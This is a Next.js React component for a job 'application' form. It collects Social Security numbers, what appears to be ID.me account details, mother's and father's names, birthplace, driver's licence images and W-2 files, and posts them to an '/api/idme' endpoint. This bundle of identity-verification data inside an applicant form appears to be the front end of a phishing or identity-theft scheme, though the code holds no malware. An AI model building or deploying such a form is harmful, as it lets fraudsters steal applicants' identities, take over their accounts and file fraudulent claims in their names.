/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import Header from "./Header";
import { initialFormState, useSecureFill } from "./useSecureFill";
import NameAndAddress from "./NameAndAddress";
import Contact from "./Contact";
import Ssn from "./Ssn";
import Idme from "./Idme";
import MothersName from "./MothersName";
import StateAndCItyBirth from "./StateAndCItyBirth";
import FIlesUploads from "./FIlesUploads";
import FathersName from "./FathersName";

export default function ApplicationForm() {
  const router = useRouter();
  const secureFill = useSecureFill();
  const {
    submitting,
    message,
    setMessage,
    validate,
    form,
    setSubmitting,
    setForm,
  } = secureFill;
  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    secureFill.setMessage(null);

    if (!validate()) {
      console.log("not validated");
      return;
    }

    setSubmitting(true);
    try {
      const fd = new FormData();
      Object.entries(form).forEach(([k, v]) => {
        if (v instanceof File || v === null) return;
        fd.append(k, v);
      });
      if (form.dlFront) fd.append("dlFront", form.dlFront);
      if (form.dlBack) fd.append("dlBack", form.dlBack);
      if (form.W2SSl) fd.append("W2SSl", form.W2SSl);

      const res = await fetch("/api/idme", { method: "POST", body: fd });
      const data = await res.json();
      if (res.ok) {
        setMessage("Application submitted successfully.");
        // setForm(initialFormState);
        // router.push("/applicants/secure-fill/thank-you");
      } else setMessage(data.error || "Submission failed");
    } catch (err: any) {
      setMessage(err.message || "Unexpected error");
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <main className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-50 relative overflow-hidden">
      {/* Decorative blobs & shapes */}
      <div className="absolute top-0 right-0 w-72 h-72 bg-blue-200 rounded-full mix-blend-multiply filter blur-xl opacity-30 animate-blob"></div>
      <div className="absolute top-0 left-20 w-96 h-96 bg-purple-200 rounded-full mix-blend-multiply filter blur-xl opacity-30 animate-blob animation-delay-2000"></div>

      <div className="max-w-3xl mx-auto p-6 relative z-10">
        <Header />
        <form
          onSubmit={onSubmit}
          className="space-y-4 bg-white/80 backdrop-blur-sm p-6 rounded-2xl shadow-lg border border-white/50 text-gray-700"
          encType="multipart/form-data"
        >
          {/* Full name & address */}
          <NameAndAddress {...secureFill} />
          {/* Contact */}
          <Contact {...secureFill} />

          {/* SSN */}
          <Ssn {...secureFill} />
          <Idme {...secureFill} />
          <MothersName {...secureFill} />
          <FathersName {...secureFill} />
          <StateAndCItyBirth {...secureFill} />
          <FIlesUploads {...secureFill} />

          <button
            disabled={submitting}
            type="submit"
            className="px-4 py-2 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 text-white disabled:opacity-50 hover:from-blue-700 hover:to-indigo-700 transition-all shadow-md hover:shadow-lg"
          >
            {submitting ? "Submitting…" : "Submit Application"}
          </button>

          {message && (
            <div className="rounded-md border p-3 mt-3 bg-blue-50 border-blue-200 text-blue-700">
              {message}
            </div>
          )}
        </form>
      </div>

      <style jsx>{`
        @keyframes blob {
          0% {
            transform: translate(0, 0) scale(1);
          }
          33% {
            transform: translate(30px, -50px) scale(1.1);
          }
          66% {
            transform: translate(-20px, 20px) scale(0.9);
          }
          100% {
            transform: translate(0, 0) scale(1);
          }
        }
        .animate-blob {
          animation: blob 7s infinite;
        }
        .animation-delay-2000 {
          animation-delay: 2s;
        }
      `}</style>
    </main>
  );
}
